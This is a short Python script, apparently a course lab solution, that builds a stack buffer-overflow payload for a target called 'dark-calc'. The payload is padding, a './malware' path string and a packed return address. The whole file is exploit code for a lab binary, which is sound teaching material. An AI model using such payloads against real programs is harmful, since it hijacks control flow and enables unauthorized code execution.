#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

payload  = b'./malware\x00'
payload += b'A' * 6
payload += b'B' * 8
payload += struct.pack('<Q', 0x401a6b)
payload += b'\n'

sys.stdout.buffer.write(payload)
